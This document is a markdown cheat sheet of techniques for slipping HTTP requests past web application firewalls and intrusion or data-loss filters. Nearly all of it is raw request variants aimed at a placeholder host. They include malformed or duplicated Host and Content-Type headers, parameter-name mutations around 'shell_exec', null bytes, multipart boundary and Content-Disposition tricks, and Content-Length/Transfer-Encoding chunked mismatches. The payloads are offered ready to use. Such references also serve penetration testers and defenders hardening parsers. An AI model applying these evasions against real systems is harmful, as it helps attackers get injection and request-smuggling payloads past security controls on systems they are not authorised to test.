# WAF/IPS/DLP bypass Cheat Sheet
Another way to bypass

**Add \r\n before the first line HTTP request**  

```

GET /login HTTP/1.1
Host: favoritewaf.com
User-Agent: Mozilla/4.0 (compatible; MSIE5.01; Windows NT)
```


**Writing the method with a lowercase (Apache)**
```
get /login HTTP/1.1
Host: favoritewaf.com
User-Agent: Mozilla/4.0 (compatible; MSIE5.01; Windows NT)
```

**Tabs before the method (IIS)**
```
    GET /login.php HTTP/1.1
Host: favoritewaf.com
User-Agent: Mozilla/4.0 (compatible; MSIE5.01; Windows NT)
```

**GET /login?shell_exec HTTP/1.1**
```
GET /login?shell.exec HTTP/1.1
GET /login?shell[exec HTTP/1.1
GET /login?shell%5bexec HTTP/1.1
GET /login?shell%2eexec HTTP/1.1
GET /login?shell%5fexec HTTP/1.1
GET /login?shell%20exec HTTP/1.1
```

**GET /login.php?pam_param=test3**
```
GET /login.php?pam_param=test1&pam[param=test2&pam%5bparam=test3
```

**GET /login.php?hello=world HTTP/1.1**
```
GET /login.php?hello%00another_text=world HTTP/1.1
```

**HTTP Request - absoluteURI**
```
GET http://localhost/login.php HTTP/1.1
Host: favoritewaf.com
User-Agent: Mozilla/4.0 (compatible; MSIE5.01; Windows NT)
```

**Double host header**
```
GET /login.php HTTP/1.1
Host: favoritewaf.com
Host: localhost
User-Agent: Mozilla/4.0 (compatible; MSIE5.01; Windows NT)
```

**Host with lowercase**
```
GET /login.php HTTP/1.1
host: favoritewaf.com
User-Agent: Mozilla/4.0 (compatible; MSIE5.01; Windows NT)
```

**Host without space**
```
GET /login.php HTTP/1.1
Host:favoritewaf.com
User-Agent: Mozilla/4.0 (compatible; MSIE5.01; Windows NT)
```
**Host with tab**
```
GET /login.php HTTP/1.1
Host:	favoritewaf.com
User-Agent: Mozilla/4.0 (compatible; MSIE5.01; Windows NT)
```
**Host with addition symbols**

/
:
\x00
\x20
\x09
\xad (IIS)

Example:
```
GET /login.php HTTP/1.1
Host: favoritewaf.com:12345
User-Agent: Mozilla/4.0 (compatible; MSIE5.01; Windows NT)
```

```
GET /login.php HTTP/1.1
Host: favoritewaf.com ignored.text
User-Agent: Mozilla/4.0 (compatible; MSIE5.01; Windows NT)
```

**Content-Type with another text** 
```
POST /login.php HTTP/1.1
Host: favoritewaf.com
User-Agent: Mozilla/4.0 (compatible; MSIE5.01; Windows NT)
Content-Type: application/another-text/+++x-www-form-urlencoded

hello=world
```

**HTTP request with incorrect Content-Length (more data than specified)**
```
GET /login.php HTTP/1.1
Host: favoritewaf.com
User-Agent: Mozilla/4.0 (compatible; MSIE5.01; Windows NT)
Content-Length: 1

AAAAAAAA
```

**Double Content-Type**
```
Content-Type: multipart/form-data; boundary=ZZZ
Content-Type: multipart/form-data; boundary=AAA
```

**Content-Disposition mutation**
```
GET /login.php HTTP/1.1
Host: favoritewaf.com
User-Agent: Mozilla/4.0 (compatible; MSIE5.01; Windows NT)
Accept-Language: en-us
Accept-Encoding: gzip, deflate
Connection: Keep-Alive
Content-Type: multipart/form-data; boundary=--------1218108630

----------1218108630
Content-Disposition: form-data; name="hello"

world
----------1218108630--
```

```
Content-Disposition: form-data; name="hello"
Content-Disposition: form-data; name="hello
Content-Disposition: form-data; name="hello"world"
Content-Disposition: attachment; name="hello"
```


```
Content-Type: multipart/form-data; boundary=x


--x
Content-Disposition:
test1;
--x
test2;
--x--
test3;
name="hello"

world
```
**Boundary mutation**
**PHP**

```
Content-Type: multipart/form-data; myfavoriteboundaryis=X; boundary=Hello;
==
Content-Type: multipart/form-data; boundary=X;
```


**Nullbyte**
```
Content-Type: multipart/form-data; boundary=HELLO\x00XXXXXXXXX
==
Content-Type: multipart/form-data; boundary=HELLO
```

**Ignored Content-Length**
```
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

hello=world
```

==
```
Content-Length: 22
Transfer-Encoding: chunked

0B
hello=world
0

```

==
```
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
Transfer-Encoding: chunked

3
hel
3
lo=
3
wor
2
ld
0
```
